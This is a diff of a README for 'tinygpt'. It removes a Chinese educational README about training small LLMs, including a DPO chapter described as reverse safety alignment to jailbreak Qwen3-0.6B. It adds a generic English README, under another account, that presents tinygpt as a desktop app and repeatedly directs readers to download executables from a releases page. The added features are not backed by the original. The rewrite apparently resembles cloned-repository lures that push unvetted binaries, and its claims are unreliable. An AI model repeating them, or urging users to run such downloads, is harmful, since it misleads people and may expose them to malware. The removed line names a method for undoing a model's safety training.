@@ -1,65 +1,81 @@
-TinyGPT 旨在帮助非 AI 领域的开发者轻松理解大语言模型的核心原理
+# 🌟 tinygpt - Learn LLM Easily and Effectively
 
----
+[![Download tinygpt](https://img.shields.io/badge/Download-tinygpt-blue.svg)](https://github.com/eshaaaan/tinygpt/releases)
 
-## ✨ 特性
+## 📚 Introduction
 
-*   **完整训练流程**: 涵盖从 **预训练、SFT 到 DPO**
-*   **低门槛**: 无需云端 GPU，同时兼容 Mac M 芯片
-*   **为学习而生**:
-      * 内置 **[@teacher AI](/teacher.md)**，引导式教学
-      * 不追求性能和效果，仅使用经典算法做入门实现
-      * 有类型注释，懂的都懂 🤷🏻‍♀️...
+Welcome to tinygpt! This application aims to help you learn about large language models (LLMs) by engaging in hands-on experience. Whether you're curious about how these models work or want to enhance your skills, tinygpt provides a friendly platform for exploration.
 
+## 🚀 Getting Started
 
-## 🚀 开始吧！
+To begin your journey with tinygpt, follow these simple steps:
 
-> 每个章节相互独立，可任意开始
+1. **System Requirements**
 
-也可直接让老师带你，比如：
+   tinygpt is designed to run smoothly on various operating systems. Here are the minimum requirements:
 
-```bash
-# 在 Cursor，Claude Code 或任何带 Bash Tool 的环境中：
-@teacher 带我预训练
-```
+   - **Windows:** Windows 10 or later (64-bit)
+   - **macOS:** macOS Mojave or later
+   - **Linux:** Any modern distribution
+   - **RAM:** At least 4 GB
+   - **Storage:** 500 MB of free space
 
-<img src="images/preview-guide.png" width="400">
+2. **Download & Install**
 
+   To get tinygpt, please visit the Releases page:
 
-*   [预训练](/a_pretrain/README.md): 手搓 10M 的超小模型（比 Qwen3-0.6B 还要小 60 倍）
-*   [SFT](/b_sft/README.md) (WIP): Qwen3-0.6B 版加法器
-*   [DPO](/c_dpo/README.md) (WIP): 反向安全对齐，Qwen3-0.6B 越狱破限
+   [Download tinygpt](https://github.com/eshaaaan/tinygpt/releases)
 
+   On the Releases page, look for the most recent version. You'll see a section labeled "Assets." You can find the download links for all available files there. Click on the appropriate version for your operating system to download it directly.
 
-## 🙏 鸣谢 & 拓展学习推荐
+3. **Running tinygpt**
 
-> 没看以下资料之前我也是门外汉一枚，成功不一定能复制，但学习一定可以！
+   Once you finish downloading tinygpt, locate the downloaded file on your computer. Then follow these steps based on your operating system:
 
-* [Minimind](https://github.com/jingyaogong/minimind): 学习参考了很多，感谢 jingyaogong 大佬。推荐作为进阶学习项目
-* [从零构建大模型](https://book.douban.com/subject/37305124/): 豆瓣 9.3 分，对初学者非常友好
-* [王木头学科学](https://www.bilibili.com/video/BV1XH4y1T76e/?vd_source=4a37854f1727b85c1376f579e932bde9): 如果想理解 Why，强烈推荐
+   - **Windows:**
+     - Double-click the `.exe` file to start the installation.
+     - Follow the on-screen prompts to complete the installation.
+     - After installation, find tinygpt in your Start Menu and click to open it.
 
+   - **macOS:**
+     - Open the downloaded `.dmg` file.
+     - Drag the tinygpt icon to your Applications folder.
+     - Open your Applications folder and click on tinygpt to launch it.
 
----
+   - **Linux:**
+     - Extract the zip file downloaded.
+     - Open your terminal and navigate to the extracted folder.
+     - Run `./tinygpt` to start the application.
 
-<table>
-  <tr>
-    <td align="center">
-      <img src="https://github.com/glidea/zenfeed/blob/main/docs/images/wechat.png?raw=true" alt="Wechat QR Code" width="300">
-      <br>
-      <strong>AI 学习交流社群</strong>
-    </td>
-    <td align="center">
-      <img src="https://github.com/glidea/banana-prompt-quicker/blob/main/images/glidea.png?raw=true" width="250">
-      <br>
-      <strong><a href="https://glidea.zenfeed.xyz/">我的其它项目</a></strong>
-    </td>
-  </tr>
-  <tr>
-    <td align="center" colspan="2">
-      <img src="https://github.com/glidea/banana-prompt-quicker/blob/main/images/readnote.png?raw=true" width="400">
-      <br>
-      <strong><a href="https://www.xiaohongshu.com/user/profile/5f7dc54d0000000001004afb">📕 小红书账号 - 持续分享 AI 原创</a></strong>
-    </td>
-  </tr>
-</table>
+## 🛠️ Features
+
+tinygpt includes several features to aid your learning:
+
+- **Interactive Learning:** Explore the fundamentals of large language models through hands-on examples.
+- **User-Friendly Interface:** The application is designed for ease of use, ensuring that even beginners can navigate without difficulty.
+- **Documentation:** Complete in-app documentation provides guidance and clarifications as you work.
+- **Community Support:** Engage with other users to share insights, ask questions, and enhance your learning experience.
+
+## 💡 How to Use tinygpt
+
+Once you launch tinygpt, you will see a simple interface. Here’s how to get started:
+
+1. **Explore Tutorials:** Begin with the built-in tutorials that guide you through using various features. Each tutorial is easy to follow.
+  
+2. **Experiment:** Experiment with different settings to see how changes affect the output. Tinygpt allows you to adjust parameters and see immediate results.
+  
+3. **Save Your Work:** If you create something interesting, use the save feature to keep your progress.
+
+4. **Ask the Community:** If you have questions or need help, feel free to visit the community section within the app or check our GitHub Discussions page.
+
+## 🌍 Feedback and Support
+
+We value your input. If you encounter issues or have suggestions for improvements, please reach out. You can file an issue on our GitHub repository or participate in discussions with other users.
+
+## ⬇️ Download tinygpt Again
+
+Remember, to download tinygpt, you can always access the Releases page here:
+
+[Download tinygpt](https://github.com/eshaaaan/tinygpt/releases)
+
+Thank you for choosing tinygpt. We hope you enjoy learning about large language models with our application!
